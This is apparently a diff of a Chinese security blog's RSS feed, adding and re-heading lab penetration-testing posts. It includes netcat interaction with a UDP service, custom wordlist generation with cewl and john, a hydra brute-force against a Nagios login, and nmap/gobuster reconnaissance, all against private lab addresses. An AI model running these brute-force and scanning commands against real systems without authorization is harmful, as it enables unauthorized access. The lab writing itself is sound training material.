+            <guid>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
             <description>&lt;blockquote&gt;
 &lt;p&gt;本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析&lt;/p&gt;&lt;/blockquote&gt;
 &lt;h1 id=&#34;靶机分类&#34;&gt;靶机分类&lt;/h1&gt;
@@ -873,7 +921,24 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 <li>Hack The Box 的靶机  Broker，通过利用 ActiveMQ 的 CVE payload 获得初始立足点</li>
 </ul>
 <h3 id="medium-类型">Medium 类型</h3>
-<p>这类靶机相对 Easy 类型靶机攻击难度略微复杂</p>
+<p>这类靶机相对 Easy 类型靶机攻击难度略微复杂 。</p>
+<h3 id="hard-类型">Hard 类型</h3>
+<p>这类靶机通常需要多个攻击链利用，渗透难度较大。</p>
+<h1 id="遇见的情况以及方法论">遇见的情况以及方法论</h1>
+<h2 id="开放的非常规端口">开放的非常规端口</h2>
+<p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ nc -u 10.10.10.45 1440
+?
+
+Wrong Code!!
+We&#39;ll notify Commander Tarkin of this offense
+</code></pre><p>使用 echo 传输字符串并通过 nc 链接端口。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ echo &#34;DS-1@OBS&#34; | nc -u 10.10.10.45 1440
+......
+</code></pre><blockquote>
+<p>本文章持续更新中</p></blockquote>
 ]]></content>
         </item>
         
@@ -884,8 +949,8 @@ Use &#34;--help [option]&#34; to view documentation for a given option
             
             <guid>http://localhost:1313/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid>
             <description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
-&lt;h1 id=&#34;可能使用到的-cewl-及-john-命令及解释&#34;&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h1&gt;
-&lt;h2 id=&#34;cewl-语句及其解释&#34;&gt;Cewl 语句及其解释&lt;/h2&gt;
+&lt;h2 id=&#34;可能使用到的-cewl-及-john-命令及解释&#34;&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h2&gt;
+&lt;h3 id=&#34;cewl-语句及其解释&#34;&gt;Cewl 语句及其解释&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo cewl http://10.10.10.48 -w password.txt 
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令直接指定 &lt;em&gt;url&lt;/em&gt; 生成一个包含所有提取单词的字典文件，并保存为 &lt;em&gt;password.txt&lt;/em&gt; 文件。&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo cewl -m 6 http://10.10.10.48 -w password.txt 
@@ -896,12 +961,12 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 &lt;em&gt;-c&lt;/em&gt; 去除重复单词，并显示单词出现的次数。&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo cewl -e http://10.10.10.48 -w password.txt 
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 -&lt;em&gt;e&lt;/em&gt; 保留所有发现的电子邮件地址。&lt;/p&gt;
-&lt;h2 id=&#34;john-语法及其解释&#34;&gt;john 语法及其解释&lt;/h2&gt;
+&lt;h3 id=&#34;john-语法及其解释&#34;&gt;john 语法及其解释&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo john --rules -wordlist=password.txt --stdout | sort | uniq &amp;gt; wordlist.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 &lt;em&gt;&amp;ndash;rules&lt;/em&gt; 指定内置密码规则生成新密码组合，&lt;em&gt;&amp;ndash;wordlist=password.txt&lt;/em&gt; 指定原始字典为 &lt;em&gt;passowrd.txt&lt;/em&gt; ，使用 &lt;em&gt;&amp;ndash;stdout&lt;/em&gt; 将生成的密码标准输出，&lt;em&gt;sort&lt;/em&gt; 对单词进行排序，&lt;em&gt;uniq&lt;/em&gt; 去重。&lt;/p&gt;</description>
             <content type="html"><![CDATA[<p>在遇到目标网站且使用 <em>kali</em> 默认的 <em>rockyou</em> 字典爆破时间过长时可以尝试通过 <em>cewl</em> 与 <em>john</em> 结合生成目标定制的字典缩短爆破时间。</p>
-<h1 id="可能使用到的-cewl-及-john-命令及解释">可能使用到的 Cewl 及 john 命令及解释</h1>
-<h2 id="cewl-语句及其解释">Cewl 语句及其解释</h2>
+<h2 id="可能使用到的-cewl-及-john-命令及解释">可能使用到的 Cewl 及 john 命令及解释</h2>
+<h3 id="cewl-语句及其解释">Cewl 语句及其解释</h3>
 <pre tabindex="0"><code>sudo cewl http://10.10.10.48 -w password.txt 
 </code></pre><p>这个命令直接指定 <em>url</em> 生成一个包含所有提取单词的字典文件，并保存为 <em>password.txt</em> 文件。</p>
 <pre tabindex="0"><code>sudo cewl -m 6 http://10.10.10.48 -w password.txt 
@@ -912,10 +977,10 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 </code></pre><p>这个命令使用 <em>-c</em> 去除重复单词，并显示单词出现的次数。</p>
 <pre tabindex="0"><code>sudo cewl -e http://10.10.10.48 -w password.txt 
 </code></pre><p>这个命令使用 -<em>e</em> 保留所有发现的电子邮件地址。</p>
-<h2 id="john-语法及其解释">john 语法及其解释</h2>
+<h3 id="john-语法及其解释">john 语法及其解释</h3>
 <pre tabindex="0"><code>sudo john --rules -wordlist=password.txt --stdout | sort | uniq &gt; wordlist.txt
 </code></pre><p>使用 <em>&ndash;rules</em> 指定内置密码规则生成新密码组合，<em>&ndash;wordlist=password.txt</em> 指定原始字典为 <em>passowrd.txt</em> ，使用 <em>&ndash;stdout</em> 将生成的密码标准输出，<em>sort</em> 对单词进行排序，<em>uniq</em> 去重。</p>
-<h1 id="使用-hydra-指定生成的字典进行爆破">使用 hydra 指定生成的字典进行爆破</h1>
+<h2 id="使用-hydra-指定生成的字典进行爆破">使用 hydra 指定生成的字典进行爆破</h2>
 <pre tabindex="0"><code>sudo hydra -L users.txt -P wordlist.txt 10.10.10.48 http-get /nagios
 </code></pre><p><img src="result.png" alt="结果"></p>
 ]]></content>
@@ -1234,12 +1299,12 @@ open x.jpg
             <guid>http://localhost:1313/posts/%E5%A6%82%E4%BD%95%E4%B8%BA%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE-dhcp/</guid>
             <description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;&lt;/blockquote&gt;
-&lt;h1 id=&#34;环境判断&#34;&gt;环境判断&lt;/h1&gt;
+&lt;h2 id=&#34;环境判断&#34;&gt;环境判断&lt;/h2&gt;
 &lt;p&gt;确保靶机为 NAT 连接&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;NTA.png&#34; alt=&#34;NTA&#34;&gt;&lt;/p&gt;
 &lt;p&gt;在 kali 中执行 nmap 扫描，未发现靶机的地址&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;%E5%88%9D%E6%AC%A1%E6%89%AB%E6%8F%8F.png&#34; alt=&#34;初次扫描&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;获取-dhcp&#34;&gt;获取 DHCP&lt;/h1&gt;
+&lt;h2 id=&#34;获取-dhcp&#34;&gt;获取 DHCP&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.volcengine.com/docs/6396/81140&#34;&gt;如何进入单用户模式&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;以 Debian 为例，进入单用户模式后查看网卡信息，为 ens33&lt;/p&gt;
@@ -1254,12 +1319,12 @@ open x.jpg
 &lt;p&gt;&lt;img src=&#34;%E8%8E%B7%E5%BE%97ip.png&#34; alt=&#34;获得ip.png&#34;&gt;&lt;/p&gt;</description>
             <content type="html"><![CDATA[<blockquote>
 <p>此文章以 kali 地址为 10.10.10.5 为示例</p></blockquote>
-<h1 id="环境判断">环境判断</h1>
+<h2 id="环境判断">环境判断</h2>
 <p>确保靶机为 NAT 连接</p>
 <p><img src="NTA.png" alt="NTA"></p>
 <p>在 kali 中执行 nmap 扫描，未发现靶机的地址</p>
 <p><img src="%E5%88%9D%E6%AC%A1%E6%89%AB%E6%8F%8F.png" alt="初次扫描"></p>
-<h1 id="获取-dhcp">获取 DHCP</h1>
+<h2 id="获取-dhcp">获取 DHCP</h2>
 <blockquote>
 <p><a href="https://www.volcengine.com/docs/6396/81140">如何进入单用户模式</a></p></blockquote>
 <p>以 Debian 为例，进入单用户模式后查看网卡信息，为 ens33</p>
@@ -1391,7 +1456,7 @@ exit
             <description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;&lt;/blockquote&gt;
 &lt;h1 id=&#34;credit-card-scammers-靶场&#34;&gt;Credit Card Scammers 靶场&lt;/h1&gt;
-&lt;h1 id=&#34;服务扫描&#34;&gt;服务扫描&lt;/h1&gt;
+&lt;h2 id=&#34;服务扫描&#34;&gt;服务扫描&lt;/h2&gt;
 &lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
 
@@ -1405,7 +1470,7 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 &lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png&#34; alt=&#34;bbb.png&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;web-渗透&#34;&gt;Web 渗透&lt;/h1&gt;
+&lt;h2 id=&#34;web-渗透&#34;&gt;Web 渗透&lt;/h2&gt;
 &lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png&#34; alt=&#34;ccc.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
@@ -1422,7 +1487,7 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
             <content type="html"><![CDATA[<blockquote>
 <p>此文章以 kali 地址为 10.10.10.5 为示例</p></blockquote>
 <h1 id="credit-card-scammers-靶场">Credit Card Scammers 靶场</h1>
-<h1 id="服务扫描">服务扫描</h1>
+<h2 id="服务扫描">服务扫描</h2>
 <p>扫描所执行的命令，执行结果如下</p>
 <pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
 
@@ -1436,7 +1501,7 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 <p>在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破</p>
 <pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
 </code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"></p>
-<h1 id="web-渗透">Web 渗透</h1>
+<h2 id="web-渗透">Web 渗透</h2>
 <p>审计爆破的目录发现在 admin 下有一个登入界面</p>
 <p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"></p>
 <p>默认界面能找到提交表单</p>
